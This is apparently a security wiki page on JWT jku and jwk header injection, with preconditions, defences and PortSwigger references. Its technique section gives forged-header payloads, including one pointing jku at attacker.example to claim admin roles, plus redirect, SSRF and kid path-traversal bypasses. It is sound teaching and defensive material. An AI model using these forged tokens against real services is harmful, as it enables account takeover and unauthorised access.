---
title: JWT jku / jwk header injection
slug: jwt-jku-jwk-injection
---

> **TL;DR:** The token's header tells the verifier where to find the verification key. Pointing `jku` at an attacker-hosted JWKS, or embedding an attacker `jwk` directly in the header, makes the server validate tokens you signed with your own key.

## What it is
JWTs can carry `jku` (JWK Set URL) or `jwk` (embedded JSON Web Key) in their header. Libraries that follow either field without an allowlist will fetch or accept attacker-supplied public keys and use them for signature verification. The attacker signs a forged token with their private key, points the header at their public key, and the server happily verifies and trusts the claims.

## Preconditions / where it applies
- A service that accepts JWTs and honours `jku` or `jwk` headers (older `jsonwebtoken`-style libraries, misconfigured Java JOSE stacks)
- For `jku`: attacker-controlled HTTP origin reachable from the verifier (sometimes the same domain via open redirect or path traversal)
- No allowlist of trusted issuer URLs or kid pinning

## Technique
**jku variant.**
1. Generate a keypair and host a JWKS at an attacker URL:

   ```bash
   # generate
   openssl genpkey -algorithm RSA -out priv.pem
   # publish jwks.json containing the public key, kid, alg=RS256
   ```

2. Forge a token whose header references your JWKS:

   ```json
   {"alg":"RS256","kid":"atk-1","jku":"https://attacker.example/jwks.json","typ":"JWT"}
   ```

3. Set claims as desired (`sub`, `role:admin`, `exp` in future), sign with `priv.pem`, submit.
4. If the server restricts `jku` to its own domain, look for: open redirect (`jku=https://victim.com/redir?url=attacker`), SSRF, or path traversal in a JWKS-serving endpoint that allows escaping to attacker content.

**jwk variant.**
Embed the full public key in the header — no fetch needed:

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB","kid":"atk"}}
```

Some libraries verify using the embedded key without checking it against a trust store.

**kid manipulation** is the sibling bug: `kid` injection can pivot a verifier to a file (`../../dev/null`) or a SQL row containing attacker data; see also [[jwt-key-confusion]].

## Detection and defence
- Disable `jku`/`jwk` header processing unless explicitly required
- If `jku` must be used, pin to an allowlist of exact URLs — no domain wildcards, no following redirects
- Pin keys by `kid` from a server-side keystore; never trust header-provided key material
- Log `jku`/`jwk` presence and alert — most legitimate clients never set them
- Use a JWT library audited against `jwt.io`'s known-bad list; reject `alg: none`

## References
- [PortSwigger: jku injection](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter) — labs and payloads
- [PortSwigger: jwk injection](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter) — embedded-key variant
- [RFC 7515 JOSE](https://datatracker.ietf.org/doc/html/rfc7515) — header field definitions
